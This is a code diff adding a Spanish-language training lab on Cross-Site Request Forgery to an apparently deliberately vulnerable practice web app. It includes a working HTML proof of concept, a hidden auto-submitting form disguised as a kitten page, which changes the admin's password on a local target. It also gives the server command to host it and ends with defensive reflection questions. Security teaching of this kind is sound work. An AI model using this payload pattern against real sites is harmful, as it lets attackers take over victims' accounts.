@@ -781,7 +781,7 @@ LABS = {
                 <li><strong>Prueba:</strong> Verificación de mecanismos anti-CSRF en cambios de estado.</li>
                 <li><strong>Vector:</strong> Inspección del código fuente de los formularios (Cambio de contraseña, Perfil, Foro).</li>
                 <li><strong>Objetivo:</strong> Confirmar la ausencia de tokens CSRF ocultos (<code>csrf_token</code>) y la dependencia exclusiva de cookies para la sesión.</li>
-                <li><strong>Guía:</strong> Revisar conceptos del <strong>LAB-06</strong> sobre atributos <code>SameSite</code> y validación de origen.</li>
+                <li><strong>Guía:</strong> Sigue las instrucciones del <strong>LAB-11 (CSRF)</strong> para crear una página que fuerce a un usuario a cambiar su contraseña sin su consentimiento.</li>
             </ul>
 
             <hr>
@@ -843,6 +843,65 @@ LABS = {
                 <li>Has ejecutado JavaScript en el navegador de una víctima (simulada) mediante XSS Reflejado y Almacenado.</li>
                 <li>Has verificado que <strong>ninguno</strong> de estos ataques funciona en el Modo Seguro y puedes explicar <strong>por qué</strong>, señalando el código fuente correcto.</li>
             </ol>
+        """
+    },
+    "lab-11-csrf": {
+        "title": "Laboratorio 11: Cross-Site Request Forgery (CSRF)",
+        "summary": "Forzar a un usuario autenticado a realizar una acción no deseada (cambiar contraseña) sin su consentimiento.",
+        "content": """
+            <h2>🎯 Objetivo</h2>
+            <p>Forzar a un usuario autenticado (la víctima) a realizar una acción no deseada sin su consentimiento, como cambiar su propia contraseña.</p>
+
+            <h2>📋 Prerrequisitos</h2>
+            <ol>
+                <li><strong>Entorno:</strong> Cadel Academy en Modo Vulnerable.</li>
+                <li><strong>Víctima:</strong> Una sesión activa en el navegador (ej. como 'admin').</li>
+                <li><strong>Atacante:</strong> Un editor de texto y un servidor web simple (Python).</li>
+            </ol>
+
+            <h2>📝 Instrucciones Paso a Paso</h2>
+            <p>La vulnerabilidad de CSRF existe porque los formularios de la aplicación que cambian el estado (como el de cambiar contraseña) no incluyen un token único y secreto para verificar que la petición se originó en la propia aplicación. El servidor confía ciegamente en la cookie de sesión del usuario.</p>
+
+            <h3>Paso 1: Crear la Página Maliciosa</h3>
+            <p>En tu máquina de atacante (Kali), crea un archivo llamado <code>csrf_attack.html</code>. Este archivo contendrá un formulario oculto que imita al de "Cambiar Contraseña" del perfil.</p>
+            <pre><code class="language-html">&lt;html&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Página de Gatitos Inofensiva&lt;/h1&gt;
+    &lt;!-- Formulario CSRF oculto --&gt;
+    &lt;form id="csrf-form" action="http://localhost:8080/profile" method="POST" style="display:none;"&gt;
+      &lt;input type="hidden" name="action" value="change_password" /&gt;
+      &lt;input type="hidden" name="current_password" value="admin123" /&gt;
+      &lt;input type="hidden" name="new_password" value="pwned123" /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+      document.getElementById('csrf-form').submit();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+            <h3>Paso 2: Servir la Página Maliciosa</h3>
+            <ol>
+                <li>En la terminal de tu máquina atacante, en la misma carpeta donde guardaste <code>csrf_attack.html</code>, inicia un servidor web:
+                    <pre><code class="language-bash">python3 -m http.server 9000</code></pre>
+                </li>
+                <li>Tu página maliciosa ahora está disponible en <code>http://&lt;TU_IP_KALI&gt;:9000/csrf_attack.html</code>.</li>
+            </ol>
+
+            <h3>Paso 3: Engañar a la Víctima</h3>
+            <ol>
+                <li>Asegúrate de que en otro navegador (o en el mismo) tienes una sesión iniciada como 'admin' en <code>http://localhost:8080</code>.</li>
+                <li>Ahora, como si fueras la víctima, visita la URL del atacante.</li>
+                <li>Verás la página de gatitos por un instante. En segundo plano, tu navegador habrá enviado la petición <code>POST</code> a Cadel Academy, incluyendo tu cookie de sesión de 'admin'.</li>
+            </ol>
+
+            <h2>🏁 Verificación</h2>
+            <ol>
+                <li>Intenta cerrar sesión en Cadel Academy y volver a entrar como <code>admin</code> con la contraseña original (<code>admin123</code>). Debería fallar.</li>
+                <li>Intenta iniciar sesión con la nueva contraseña (<code>pwned123</code>). Debería funcionar.</li>
+            </ol>
+
+            <h2>🛡️ Preguntas de Reflexión</h2>
+            <p>¿Cómo previene el modo seguro este ataque? (Pista: Revisa las cookies y busca el atributo <code>SameSite=Strict</code>). ¿Qué es un token CSRF y cómo se implementaría en el formulario para mitigar este riesgo?</p>
         """
     }
 }
